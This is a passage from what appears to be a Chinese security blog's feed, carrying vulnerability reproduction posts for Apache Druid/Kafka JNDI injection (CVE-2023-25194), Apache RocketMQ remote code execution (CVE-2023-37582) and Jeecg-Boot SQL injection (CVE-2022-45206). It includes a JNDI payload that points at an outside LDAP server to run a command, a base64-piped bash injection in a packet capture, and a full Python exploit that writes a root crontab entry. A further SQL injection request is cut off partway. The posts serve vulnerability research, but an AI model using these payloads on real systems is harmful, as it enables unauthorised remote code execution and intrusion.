class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.21.138:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.21.138:8888/unified-console.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;consumerProperties&quot;</span>:&#123;<span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:1234&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://124.222.21.138:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">&#125;,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,<span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;,<span class="string">&quot;granularitySpec&quot;</span>:&#123;<span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span>&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidAttack.png" class><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/success-25194.png" class><p>在 <code>druid-kafka-indexing-service</code> 这个 extension 中可以看到实例化 KafkaConsumer 的过程</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/KafkaRecordSupplier.png" class><p>而上面第 286 行的 <code>addConsumerPropertiesFromConfig()</code> 正是进行了动态修改配置</p><p>Apache Druid 26.0.0 更新了 kafka 依赖的版本</p><p><a class="link" href="https://github.com/apache/druid/blob/26.0.0/pom.xml#L79">https://github.com/apache/druid/blob/26.0.0/pom.xml#L79<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidNewVersion.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-25194 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-37582 Apache RocketMQ RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-21T03:42:50.000Z</published>
    <updated>2023-11-21T03:49:59.958Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-37582-漏洞分析"><a href="#CVE-2023-37582-漏洞分析" class="headerlink" title="CVE-2023-37582 漏洞分析"></a>CVE-2023-37582 漏洞分析</h1><p>调试端口</p><p>10011 broker<br>10012 namsrv</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>RocketMQ 是一个开源的分布式消息中间件，NameServer 为 Producer 和 Consumer 节点提供路由信息的组件。</p><p>由于 CVE-2023-33246 的补丁中并未对 DefaultRequestProcessor#updateConfig 方法中的 configStorePath 属性值进行过滤，当 NameServer 地址暴露在公网并且缺乏权限校验，未经授权的攻击者可 payload 注入到 configStorePath 中，调用 NameServer 的更新配置函数将恶意文件上传到 RocketMQ 服务器中实现远程代码执行。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.1<br>Apache RocketMQ &lt;&#x3D; 4.9.6</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先 wget 需要的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip</span><br></pre></td></tr></table></figure><p>然后 <strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://mirrors.tuna.tsinghua.edu.cn/apache/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10012</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10011</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实这里用之前 CVE-2023-33246 的环境也可以，但是最好是用 4.x 的，下载环境需要一段时间</p><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><p>这个漏洞本质上是 CVE-2023-33246 的补丁绕过，或者也可以说根本没有做什么防护，先来看 diff</p><p><a class="link" href="https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d">https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>很简单的 diff，只是把 <code>configStorePathName</code> 改成了 <code>configStorePath</code></p><p>上一次在分析 CVE-2023-33246 的时候，我抓过一个流量包，其中的内容就是在 CVE-2023-33246 中的 rocketmq 协议。</p><p>拿其中的一段 TCP 流量出来说</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TCP.png" class><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">25</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span>filterServerNums=<span class="number">1</span></span><br><span class="line">rocketmqHome=-c <span class="punctuation">&#123;</span>echo<span class="punctuation">,</span>dG91Y2ggL3RtcC9mbGFn<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>base64<span class="punctuation">,</span>-d<span class="punctuation">&#125;</span>|bash -c</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;extFields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;counter\&quot;:1,\&quot;stateVersion\&quot;:0,\&quot;timestamp\&quot;:1689312950437&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很显然，目前提取出来的部分应该是 TCP 请求中的一段参数，下个断点分析一下这一段通信过程</p><h3 id="通信过程分析"><a href="#通信过程分析" class="headerlink" title="通信过程分析"></a>通信过程分析</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...c..._<span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span>...d...</span><br></pre></td></tr></table></figure><p>协议主要包含四部分  协议总长度+ json 长度+ json + body，前后两段的 c、d 对应的是 ascii 码</p><p>在这一段 json 数据包当中，比较引人注目的是 <code>&quot;code&quot;:25</code>，不同的 code 代表了不同的业务，根据数据包当中的 code 字段，程序会进行不同的业务处理，处理业务在 <code>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest</code> 方法中</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCodeStatus.png" class><p>其中代码块 <code>case RequestCode.UPDATEE_BROKER_CONFIG</code> 提到一个类 <code>RequestCode</code>，后续会用到</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCode.png" class><p>跟进 <code>this.updateBrokerConfig()</code> 方法，方法中先将 body 字段的值提取出来，封装进 <code>Properties</code> 类当中，封装完的结果如图</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/properties.png" class><p>往下，跟进 <code>this.brokerController.getConfiguration().update()</code> 方法，到第 187 行，循环遍历所有的配置，并根据对应类，更新配置</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/configObject.png" class><p>可以看到，经过这一步之后，里面的值已经是被更新了</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/update.png" class><p>程序接着调用 <code>persist()</code> 方法， <code>persist()</code> 方法做的业务其实是将 <code>configObjectList</code> 写入进对应的配置文件当中。</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/persist.png" class><p>很清晰的是，程序会将配置写入到两个文件中，分别是 <code>filename</code> 和 <code>filename.bak</code>，其中 <code>filename</code> 的值对应的是 <code>configStorePath</code>，也是 CVE-2023-33246 的黑名单字段</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/string2file.png" class><p>在整段程序执行结束后可以发现 <code>../conf/broker.conf</code> 的内容改变了，且 rocketHome 已经被修改为了我们的输入</p><h3 id="构造-EXP"><a href="#构造-EXP" class="headerlink" title="构造 EXP"></a>构造 EXP</h3><p>既然可以对文件进行修改与写入，根据漏洞描述，修改存储路径为计划任务路径写入 crontab 造成 RCE 即可，因为要写入 crontab，所以涉及到权限问题，其中初始化的 kvConfigPath、configStorePath 带有当前用户，而 kvConfigPath 处于黑名单中，configStorePath 还未被过滤</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/NamesrvConfig.png" class><p>且攻击目标为 namesrv，<code>brokerConfigPath</code> 是用于存储 broker 组件对应的配置文件的，在 V 5.1.1 当中，<code>brokerConfigPath</code> 是 broker 组件的黑名单</p><p>至此就可以构造出 EXP 来写入定时任务 RCE</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line"><span class="comment"># you ip</span></span><br><span class="line">client.connect((<span class="string">&#x27;124.222.21.138&#x27;</span>,<span class="number">9876</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:318,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:435&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">body=<span class="string">&#x27;configStorePath=/var/spool/cron/crontabs/root\nbrokerConfigPath=/var/spool/cron/crontabs/root\nbindAddress=0.0.0.0\\n*/1 * * * * touch /tmp/success&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = <span class="built_in">int</span>(<span class="built_in">len</span>(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(json_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head1)</span><br><span class="line">all_lens = <span class="built_in">int</span>(<span class="number">4</span>+<span class="built_in">len</span>(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(all_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head2)</span><br><span class="line">data = head2[-<span class="number">8</span>:]+head1[-<span class="number">8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data_recv)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CVE-2023-37582 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jeecg-Boot 部分历史漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-10-19T08:18:28.000Z</published>
    <updated>2023-10-19T08:20:10.235Z</updated>
    
    <content type="html"><![CDATA[<p>Jeecg-Boot 部分历史漏洞分析</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我司的任务，原本是漏洞挖掘，在漏洞挖掘之前打算先看看历史漏洞，简单分析一下。<br>本文只聚焦与 Jeecg-Boot 相关的一些漏洞，一些组件漏洞暂时不关注。</p><p>各个版本的漏洞合集</p><p><a class="link" href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&t=blog&u=zhangdaiscott&s=new">https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&amp;t=blog&amp;u=zhangdaiscott&amp;s=new<i class="fas fa-external-link-alt"></i></a></p><p>因为主要研究版本是从 Jeecg-Boot 3.0 开始的，所以 2.x.x 的版本漏洞就暂时不分析了。使用的版本是 3.2.0 的版本，相对来说非常稳定。</p><p>JeecgBoot常见问题大全 <a class="link" href="http://bbs.jeecg.com/forum.php?mod=viewthread&tid=7816&extra=page=1">http://bbs.jeecg.com/forum.php?mod=viewthread&amp;tid=7816&amp;extra=page%3D1<i class="fas fa-external-link-alt"></i></a></p><h2 id="CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞"><a href="#CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞" class="headerlink" title="CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞"></a>CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</h2><p>3.0.0 &lt;&#x3D; Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Jeecg-Boot</code> 后台服务 API 接口文档处存在 SQL 注入，漏洞对应接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=%27aa2000&amp;fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&amp;fieldVal=1000&amp;tableName=sys_log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">knife4j-gateway-code</span><span class="punctuation">: </span>ROOT</span><br><span 